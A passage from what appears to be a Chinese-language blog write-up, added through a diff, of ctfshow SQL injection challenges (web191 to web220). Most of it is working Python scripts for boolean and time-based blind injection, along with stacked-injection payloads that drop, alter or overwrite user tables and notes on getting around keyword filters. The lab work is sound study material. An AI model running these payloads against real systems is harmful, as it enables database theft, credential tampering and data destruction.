database()),&#123;&#125;,1))&lt;&#123;&#125;)#&quot;.format(i,mid)<br>        #ctfshow_web<br>        #payload = &quot;admin&#x27;and (ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1))&lt;&#123;&#125;)#&quot;.format(i,mid)<br>        #ctfshow_fl0g<br>        #payload = &quot;admin&#x27;and (ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_fl0g&#x27;),&#123;&#125;,1))&lt;&#123;&#125;)#&quot;.format(i,mid)<br>        #id,f1ag<br>        payload = &quot;admin&#x27;and (ord(substr((select f1ag from ctfshow_fl0g),&#123;&#125;,1))&lt;&#123;&#125;)#&quot;.format(i,mid)<br><br>        data = &#123;<br>            &quot;username&quot;:payload,<br>            &quot;password&quot;:0,<br>        &#125;<br>        res = requests.post(url = url,data =data)<br>        time.sleep(0.3)<br>        if res.text.find(&quot;8bef&quot;)&gt;0:<br>            max = mid<br>        else:<br>            min = mid<br></code></pre></td></tr></table></figure>
+
+<h3 id="web192"><a href="#web192" class="headerlink" title="web192"></a>web192</h3><p>都过滤了那我们直接判断</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs text">import requests<br>import sys<br>import time<br><br>url = &quot;http://5054937c-c765-4a55-8151-13ef9ff45b1a.challenge.ctf.show/api/&quot;<br>flag = &quot;&quot;<br>for i in range(1,60):<br>    max = 127<br>    mid = 32<br>    while 1:<br>        mid +=1<br><br>        #payload = &quot;admin&#x27;and (ascii(substr((select database()),&#123;&#125;,1))&lt;&#123;&#125;)#&quot;.format(i,mid)<br>        #ctfshow_web<br>        #payload = &quot;admin&#x27;and (ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1))&lt;&#123;&#125;)#&quot;.format(i,mid)<br>        #ctfshow_fl0g<br>        #payload = &quot;admin&#x27;and (ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_fl0g&#x27;),&#123;&#125;,1))&lt;&#123;&#125;)#&quot;.format(i,mid)<br>        #id,f1ag<br>        payload = &quot;admin&#x27;and ((substr((select f1ag from ctfshow_fl0g),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;))#&quot;.format(i,chr(mid))<br><br>        data = &#123;<br>            &quot;username&quot;:payload,<br>            &quot;password&quot;:0,<br>        &#125;<br>        res = requests.post(url = url,data =data)<br>        time.sleep(0.3)<br>        if res.text.find(&quot;8bef&quot;)&gt;0:<br>            flag+=chr(mid)<br>            print(&quot;***********&quot;+flag)<br>            break<br></code></pre></td></tr></table></figure>
+
+<h3 id="web193-194"><a href="#web193-194" class="headerlink" title="web193-194"></a>web193-194</h3><p>substr用mid替换</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs text">import requests<br><br>url = &quot;http://f8cc921e-653a-4710-b2b3-bb1b744f1772.challenge.ctf.show/api/index.php&quot;<br>out = &#x27;&#x27;<br>dic = &#x27;&#123;-&#125;0123456789abcdefghijklmnopqrstuvwxyz_&#x27;<br>for j in range(1, 50):<br>    print(j)<br>    for k in dic:<br><br>        # data = &#123;<br>        #     &#x27;username&#x27;: f&quot;0&#x27;||if(substr((select f1ag from ctfshow_fl0g),&#123;j&#125;,1)=&#x27;&#123;k&#125;&#x27;,1,0)#&quot;,<br>        #     &#x27;password&#x27;: &#x27;1&#x27;<br>        # &#125;<br><br>       # data = &#123;<br>       #     &#x27;username&#x27;: f&quot;0&#x27;||if((mid((select group_concat(column_name) from information_schema.columns where table_schema=&#x27;ctfshow_web&#x27; and table_name=&#x27;ctfshow_flxg&#x27;),&#123;j&#125;,1))=&#x27;&#123;k&#125;&#x27;,1,0)#&quot;,<br>       #     &#x27;password&#x27;: &#x27;1&#x27;<br>       # &#125;<br>        data = &#123;<br>                &#x27;username&#x27;: f&quot;0&#x27;||if((mid((select f1ag from ctfshow_flxg),&#123;j&#125;,1))=&#x27;&#123;k&#125;&#x27;,1,0)#&quot;,<br>                &#x27;password&#x27;: &#x27;1&#x27;<br>             &#125;<br>        re = requests.post(url, data=data)<br>        if (&quot;\\u5bc6\\u7801\\u9519\\u8bef&quot; in re.text):<br>            out += k<br>            print(out)<br>            break<br></code></pre></td></tr></table></figure>
+
+<p>可以用 left 函数，从提供的字符串的左侧提取给定数量的字符，例如 LEFT(‘SQLServer’，3) 返回 SQL。</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">&#x27;username&#x27;: f&quot;0&#x27;||if((left((select f1ag from ctfshow_flxg),&#123;j&#125;))=&#x27;&#123;out+k&#125;&#x27;,1,0)#&quot;<br></code></pre></td></tr></table></figure>
+
+<p>有 left 当然就有 right：</p>
+<p>RIGHT () 函数用于从字符串中检索最右边的指定长度的字符，这里稍微改一下结果的拼接方式</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">&#x27;username&#x27;: f&quot;0&#x27;||if((right((select f1ag from ctfshow_flxg),&#123;j&#125;))=&#x27;&#123;k+out&#125;&#x27;,1,0)#&quot;         #输出是反过来的<br></code></pre></td></tr></table></figure>
+
+<p>，还可以用 lpad 和 rpad：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs text">lpad(&#x27;123456&#x27;,2) 结果为 12<br> <br>lpad(&#x27;123456&#x27;,7,&#x27;0&#x27;) 结果为 0123456，左填充到字符串<br>#因此，我们不指定第三个参数，就可以实现和 left 和 right 一样的效果。<br></code></pre></td></tr></table></figure>
+
+<h3 id="web195（堆叠注入"><a href="#web195（堆叠注入" class="headerlink" title="web195（堆叠注入"></a>web195（堆叠注入</h3><p>根据提示是堆叠注入，然后不会，看wp</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs text">说是直接修改用户名和密码<br>1;update(ctfshow_user)set`username`=1,`pass`=1;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs text">1. UPDATE语句的基本语法<br>UPDATE语句的基本语法如下所示：<br><br>sql<br>UPDATE &lt;表名&gt; <br>SET 字段1 = 值1, 字段2 = 值2, ... <br>WHERE &lt;筛选条件&gt;;<br> <br><br>1.1 语法解析<br>&lt;表名&gt;：指定要更新数据的目标表。<br><br>SET 字段1 = 值1, 字段2 = 值2, ...：列出要更新的字段及其对应的新值。字段与值之间使用等号=连接，多个字段使用逗号,分隔。<br><br>WHERE &lt;筛选条件&gt;：指定哪些记录需要更新，确保只修改符合条件的行。<br></code></pre></td></tr></table></figure>
+
+<h3 id="web196"><a href="#web196" class="headerlink" title="web196"></a>web196</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs text">1;select(1);<br>1<br>#第二个语句控制密码？可能是这样<br></code></pre></td></tr></table></figure>
+
+<h3 id="web197"><a href="#web197" class="headerlink" title="web197"></a>web197</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs text">好玩的姿势<br>1;drop table ctfshow_user;  先删表  <br>create table ctfshow_user(username varchar(100),pass varchar(100)); 然后建表  <br>insert ctfshow_user(username,pass) value (1,2);  然后插入数字<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs text">也有类似于上一题的姿势<br>username: 1;show tables <br>password: ctfshow_user<br></code></pre></td></tr></table></figure>
+
+<h3 id="web198"><a href="#web198" class="headerlink" title="web198"></a>web198</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">insert ctfshow_user(`username`,`pass`) value(1,2);<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs text">或者0;alter table ctfshow_user change `username` `passw` varchar(100);<br>alter table ctfshow_user change `pass` `username` varchar(100);<br>alter table ctfshow_user change `passw` `pass` varchar(100);<br>#这个的前提是已知一个用户为userAUTO,我也不知道是怎么来的；就是说修改两个表名，然后使用0弱比较匹配用户名，输入密码userAUTO<br>#Alter是数据库SQL语言的修改语句，可以用来修改基本表，其一般表示格式为：<br>ALTER TABLE&lt;表名&gt;[改变方式]<br></code></pre></td></tr></table></figure>
+
+<h3 id="web199"><a href="#web199" class="headerlink" title="web199"></a>web199</h3><p>多加了个括号过滤</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">可以直接show tables;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs text">或者类似于上一题改为使用test<br>0;alter table ctfshow_user change `username` `passw` text;<br>alter table ctfshow_user change `pass` `username` text;<br>alter table ctfshow_user change `passw` `pass` text;<br></code></pre></td></tr></table></figure>
+
+<h3 id="web200"><a href="#web200" class="headerlink" title="web200"></a>web200</h3><p>加了个逗号，可用上一题解法</p>
+<h3 id="web214-时间盲注"><a href="#web214-时间盲注" class="headerlink" title="web214(时间盲注"></a>web214(时间盲注</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs text">#import requests<br><br>#url = &quot;http://1af8396a-0c8b-4ce1-842d-ff0df2c7e96d.challenge.ctf.show/api/index.php&quot;<br>#out = &#x27;&#x27;<br>#dic = &#x27;&#123;-&#125;0123456789abcdefghijklmnopqrstuvwxyz_&#x27;<br>#for j in range(1, 50):<br>#    print(j)<br>#    for k in dic:<br>#        data = &#123;&#x27;debug&#x27;:&#x27;1&#x27;,&#x27;ip&#x27;:f&quot;if(substr(database(),&#123;j&#125;,1)=&#x27;&#123;k&#125;&#x27;,sleep(3),0)&quot;&#125;<br>#        re = requests.post(url, data=data)<br>#        if re.elapsed.total_seconds()&gt;2:<br>#            out += k<br>#            print(out)<br>#            break           库是ctfshow_web<br>import requests<br><br>url = &quot;http://af06a8e3-a6e1-4096-b8a4-c34921788535.challenge.ctf.show/api/index.php&quot;<br>out = &#x27;&#x27;<br>dic = &#x27;&#123;-&#125;0123456789abcdefghijklmnopqrstuvwxyz_&#x27;<br>for j in range(1, 50):<br>    print(j)<br>    for k in dic:<br>        #data =&#123;&#x27;debug&#x27;:&#x27;1&#x27;,&#x27;ip&#x27;:f&quot;if(substr((select table_name from information_schema.tables where table_schema=&#x27;ctfshow_web&#x27; limit 0,1),&#123;j&#125;,1)=&#x27;&#123;k&#125;&#x27;,sleep(3),0)&quot;&#125;<br>        #data =&#123;&#x27;debug&#x27;:&#x27;1&#x27;,&#x27;ip&#x27;:f&quot;if(substr((select group_concat(column_name) from information_schema.columns where table_schema=&#x27;ctfshow_web&#x27; and table_name=&#x27;ctfshow_flagx&#x27;), &#123;j&#125;, 1) = &#x27;&#123;k&#125;&#x27;,sleep(3),0)&quot;&#125;<br>        data= &#123;&#x27;debug&#x27;: &#x27;1&#x27;,&#x27;ip&#x27;: f&quot;if(substr((select flaga from ctfshow_flagx), &#123;j&#125;, 1) = &#x27;&#123;k&#125;&#x27;,sleep(3),0)&quot;&#125;<br>        re = requests.post(url, data=data)<br>        if re.elapsed.total_seconds()&gt;2:<br>            out += k<br>            print(out)<br>            break              #表是ctfshow_flagx  列名是id flaga info<br></code></pre></td></tr></table></figure>
+
+<h3 id="web215"><a href="#web215" class="headerlink" title="web215"></a>web215</h3><p>加了单引号那就是要闭合和过滤了</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs text">import requests<br><br>url = &quot;http://8b3e1f15-ab2f-460d-b66e-709d75f56f71.challenge.ctf.show/api/index.php&quot;<br>out = &#x27;&#x27;<br>dic = &#x27;&#123;-&#125;0123456789abcdefghijklmnopqrstuvwxyz_&#x27;<br>for j in range(1, 50):<br>    print(j)<br>    for k in dic:<br>        #data = &#123;&#x27;debug&#x27;: &#x27;1&#x27;, &#x27;ip&#x27;: f&quot;0&#x27; or if(substr(database(),&#123;j&#125;,1)=&#x27;&#123;k&#125;&#x27;,sleep(3),0)#&quot;&#125;<br>        #data =&#123;&#x27;debug&#x27;:&#x27;1&#x27;,&#x27;ip&#x27;:f&quot;0&#x27; or if(substr((select table_name from information_schema.tables where table_schema=&#x27;ctfshow_web&#x27; limit 0,1),&#123;j&#125;,1)=&#x27;&#123;k&#125;&#x27;,sleep(3),0)#&quot;&#125;<br>        #data =&#123;&#x27;debug&#x27;:&#x27;1&#x27;,&#x27;ip&#x27;:f&quot;0&#x27; or if(substr((select group_concat(column_name) from information_schema.columns where table_schema=&#x27;ctfshow_web&#x27; and table_name=&#x27;ctfshow_flagxc&#x27;), &#123;j&#125;, 1) = &#x27;&#123;k&#125;&#x27;,sleep(3),0)#&quot;&#125;<br>        data= &#123;&#x27;debug&#x27;: &#x27;1&#x27;,&#x27;ip&#x27;: f&quot;0&#x27; or if(substr((select flagaa from ctfshow_flagxc), &#123;j&#125;, 1) = &#x27;&#123;k&#125;&#x27;,sleep(3),0)#&quot;&#125;<br>        re = requests.post(url, data=data)<br>        if re.elapsed.total_seconds()&gt;2:<br>            out += k<br>            print(out)<br>            break<br></code></pre></td></tr></table></figure>
+
+<h3 id="web216"><a href="#web216" class="headerlink" title="web216"></a>web216</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">where id = from_base64($id);被base包了<br></code></pre></td></tr></table></figure>
+
+<p>闭合id！</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs text">import requests<br><br>url = &quot;http://cf429fb8-a50a-4f1b-a485-0ee25626ce17.challenge.ctf.show/api/index.php&quot;<br>out = &#x27;&#x27;<br>dic = &#x27;&#123;-&#125;0123456789abcdefghijklmnopqrstuvwxyz_&#x27;<br>for j in range(1, 50):<br>    print(j)<br>    for k in dic:<br>        #data = &#123;&#x27;debug&#x27;: &#x27;1&#x27;, &#x27;ip&#x27;: f&quot;0) or if(substr(database(),&#123;j&#125;,1)=&#x27;&#123;k&#125;&#x27;,sleep(3),0)#&quot;&#125;<br>        #data =&#123;&#x27;debug&#x27;:&#x27;1&#x27;,&#x27;ip&#x27;:f&quot;0) or if(substr((select table_name from information_schema.tables where table_schema=&#x27;ctfshow_web&#x27; limit 0,1),&#123;j&#125;,1)=&#x27;&#123;k&#125;&#x27;,sleep(3),0)#&quot;&#125;<br>        #data =&#123;&#x27;debug&#x27;:&#x27;1&#x27;,&#x27;ip&#x27;:f&quot;0) or if(substr((select group_concat(column_name) from information_schema.columns where table_schema=&#x27;ctfshow_web&#x27; and table_name=&#x27;ctfshow_flagxcc&#x27;), &#123;j&#125;, 1) = &#x27;&#123;k&#125;&#x27;,sleep(3),0)#&quot;&#125;<br>        data = &#123;&#x27;debug&#x27;: &#x27;1&#x27;,&#x27;ip&#x27;: f&quot;0) or if(substr((select flagaac from ctfshow_flagxcc), &#123;j&#125;, 1) = &#x27;&#123;k&#125;&#x27;,sleep(3),0)#&quot;&#125;<br>        re = requests.post(url, data=data)<br>        if re.elapsed.total_seconds()&gt;2:<br>            out += k<br>            print(out)<br>            break<br></code></pre></td></tr></table></figure>
+
+<h3 id="web217"><a href="#web217" class="headerlink" title="web217"></a>web217</h3><p>用benchmark代替sleep</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs text">import requests<br>import string<br><br>url = &quot;http://3d3eeac2-0f6c-42bc-be41-1f1b03928245.challenge.ctf.show/api/index.php&quot;<br>out = &#x27;&#x27;<br>dic = string.digits + string.ascii_lowercase + &#x27;&#123;&#125;-_&#x27;<br>for j in range(1, 50):<br>    print(j)<br>    for k in dic:<br>        #data = &#123;&#x27;debug&#x27;: &#x27;1&#x27;, &#x27;ip&#x27;: f&quot;if(substr((select table_name from information_schema.tables where table_schema=&#x27;ctfshow_web&#x27; limit 0, 1), &#123;j&#125;, 1) = &#x27;&#123;k&#125;&#x27;,benchmark(3000000,md5(&#x27;abcd&#x27;)),0)&quot;&#125;<br>        #data =&#123;&#x27;debug&#x27;:&#x27;1&#x27;,&#x27;ip&#x27;:f&quot;0) or if(substr((select group_concat(column_name) from information_schema.columns where table_schema=&#x27;ctfshow_web&#x27; and table_name=&#x27;ctfshow_flagxccb&#x27;), &#123;j&#125;, 1) = &#x27;&#123;k&#125;&#x27;,benchmark(3000000,md5(&#x27;abcd&#x27;)),0)#&quot;&#125;<br>        data= &#123;&#x27;debug&#x27;: &#x27;1&#x27;,&#x27;ip&#x27;: f&quot;0) or if(substr((select flagaabc from ctfshow_flagxccb), &#123;j&#125;, 1) = &#x27;&#123;k&#125;&#x27;,benchmark(3000000,md5(&#x27;abcd&#x27;)),0)#&quot;&#125;<br>        re = requests.post(url, data=data)<br>        if re.elapsed.total_seconds()&gt;2:<br>            out += k<br>            print(out)<br>            break<br></code></pre></td></tr></table></figure>
+
+<h3 id="web218"><a href="#web218" class="headerlink" title="web218"></a>web218</h3><p>利用正则匹配时间的长短来检测所匹配的数据正误</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs text">import requests<br>from time import *<br>import string<br><br>url=&#x27;&#x27;<br>bli=string.digits+string.ascii_lowercase+&#x27;&#123;&#125;-_&#x27;<br>out=&#x27;&#x27;<br>yanshi=&quot;concat(rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;)) rlike concat(repeat(&#x27;(a.*)+&#x27;,6),&#x27;b&#x27;)&quot;<br>#rlike和regexp 是 SQL 中用于执行正则表达式匹配的函数。<br>#repeat(str,times) 就是复制 str 字符串 times 次。<br>#rpad(str,len,padstr) 用字符串 padstr 对 str 进行右边填补直到长度达到 len，返回 str <br>for j in range(1,50):<br>    for k in bli:<br>        sleep(0.2)<br>        # payload = &#123;&#x27;debug&#x27;:&#x27;1&#x27;,&#x27;ip&#x27;:f&quot;if(substr(database(),&#123;j&#125;,1)=&#x27;&#123;k&#125;&#x27;,&#123;delay&#125;,0)&quot;&#125;  # 猜数据库名<br>        # payload = &#123;&#x27;debug&#x27;: &#x27;1&#x27;, &#x27;ip&#x27;: f&quot;if(substr((select table_name from information_schema.tables where table_schema=&#x27;ctfshow_web&#x27; limit 0, 1), &#123;j&#125;, 1) = &#x27;&#123;k&#125;&#x27;,&#123;delay&#125;,0)&quot;&#125;  # 猜表名<br>        # payload = &#123;&#x27;debug&#x27;: &#x27;1&#x27;,&#x27;ip&#x27;: f&quot;if(substr((select group_concat(table_name) from information_schema.tables where table_schema=&#x27;ctfshow_web&#x27;), &#123;j&#125;, 1) = &#x27;&#123;k&#125;&#x27;,&#123;delay&#125;,0)&quot;&#125;  # 猜表名<br>        # payload = &#123;&#x27;debug&#x27;: &#x27;1&#x27;,&#x27;ip&#x27;: f&quot;if(substr((select group_concat(column_name) from information_schema.columns where table_schema=&#x27;ctfshow_web&#x27; and table_name=&#x27;ctfshow_flagxc&#x27;), &#123;j&#125;, 1) = &#x27;&#123;k&#125;&#x27;,&#123;delay&#125;,0)&quot;&#125;  # 猜列名<br>        payload=&#123;<br>            &#x27;debug&#x27;:&#x27;1&#x27;,<br>            &#x27;id&#x27;:f&quot;if(substr(select flagaac from ctfshow_flagxc),&#123;j&#125;,1)=&#x27;&#123;k&#125;&#x27;,&#123;yanshi&#125;,0)&quot;&#125;<br>        try:<br>            re=requests.post(url,data=payload,timeout=0.8)<br>        except:<br>            out+=k<br>            break<br><br>    print(out)<br>    sleep(1)<br></code></pre></td></tr></table></figure>
+
+<h3 id="web219"><a href="#web219" class="headerlink" title="web219"></a>web219</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs text">笛卡尔积（不是很了解但是能用<br>#if(2&gt;1,(select count(*) from information_schema.columns A)判断时间差异<br><br>import requests<br>import string<br><br>url = &#x27;http://1181c50a-0d3f-4101-84c6-21aa14dfaec8.challenge.ctf.show/api/index.php&#x27;<br>dic = string.digits + string.ascii_lowercase + &#x27;&#123;&#125;-_&#x27;<br>out = &#x27;&#x27;<br><br>for j in range(1, 50):<br>    for k in dic:<br>        # payload = &#123;&#x27;debug&#x27;:&#x27;1&#x27;,&#x27;ip&#x27;:f&quot;if(substr(database(),&#123;j&#125;,1)=&#x27;&#123;k&#125;&#x27;,(select count(*) from information_schema.columns A, information_schema.columns B),0)&quot;&#125;  # 猜数据库名<br>        # payload = &#123;&#x27;debug&#x27;: &#x27;1&#x27;, &#x27;ip&#x27;: f&quot;if(substr((select table_name from information_schema.tables where table_schema=&#x27;ctfshow_web&#x27; limit 0, 1), &#123;j&#125;, 1) = &#x27;&#123;k&#125;&#x27;,(select count(*) from information_schema.columns A, information_schema.columns B),0)&quot;&#125;  # 猜表名<br>        # payload = &#123;&#x27;debug&#x27;: &#x27;1&#x27;,&#x27;ip&#x27;: f&quot;if(substr((select group_concat(table_name) from information_schema.tables where table_schema=&#x27;ctfshow_web&#x27;), &#123;j&#125;, 1) = &#x27;&#123;k&#125;&#x27;,(select count(*) from information_schema.columns A, information_schema.columns B),0)&quot;&#125;  # 猜表名<br>        # payload = &#123;&#x27;debug&#x27;: &#x27;1&#x27;,&#x27;ip&#x27;: f&quot;if(substr((select group_concat(column_name) from information_schema.columns where table_schema=&#x27;ctfshow_web&#x27; and table_name=&#x27;ctfshow_flagxca&#x27;), &#123;j&#125;, 1) = &#x27;&#123;k&#125;&#x27;,(select count(*) from information_schema.columns A, information_schema.columns B),0)&quot;&#125;  # 猜列名<br>        payload = &#123;&#x27;debug&#x27;: &#x27;1&#x27;,<br>                   &#x27;ip&#x27;: f&quot;if(substr((select flagaabc from ctfshow_flagxca), &#123;j&#125;, 1) = &#x27;&#123;k&#125;&#x27;,(select count(*) from information_schema.columns A, information_schema.columns B),0)&quot;&#125;  # 跑flag<br>        re = requests.post(url, data=payload)<br>        if re.elapsed.total_seconds() &gt; 0.4:<br>            out += k<br>            break<br>    print(out)<br></code></pre></td></tr></table></figure>
+
+<h3 id="web220"><a href="#web220" class="headerlink" title="web220"></a>web220</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs text">过滤掉了 sleep|benchmark|rlike|ascii|hex|concat_ws|concat|mid|substr<br>因此没有使用到 ascii ，就算是基于 ASCII 码值判断的，ascii 被过滤了，也可以用ord 替代；<br>rlike 被过滤，如果用正则的注入则可以采用 regexp 代替；<br>mid、substr 被过滤，可以采用 right、left、rpad、lpad 等，这个方法在前面布尔盲注我们已经介绍过了，这里还可以采用 like<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs text">import requests<br>import string<br><br>url = &#x27;http://cf767830-380e-4674-9099-bca4bcfcdb34.challenge.ctf.show/api/index.php&#x27;<br>dic = string.digits + string.ascii_lowercase + &#x27;&#123;&#125;-_&#x27;<br>out = &#x27;&#x27;<br><br>for j in range(1, 50):<br>    for k in dic:<br>        # payload = &#123;&#x27;debug&#x27;:&#x27;1&#x27;,&#x27;ip&#x27;:f&quot;if(database() like &#x27;&#123;out+k&#125;%&#x27;,(select count(*) from information_schema.columns A, information_schema.columns B),0)&quot;&#125;  # 猜数据库名<br>        # payload = &#123;&#x27;debug&#x27;: 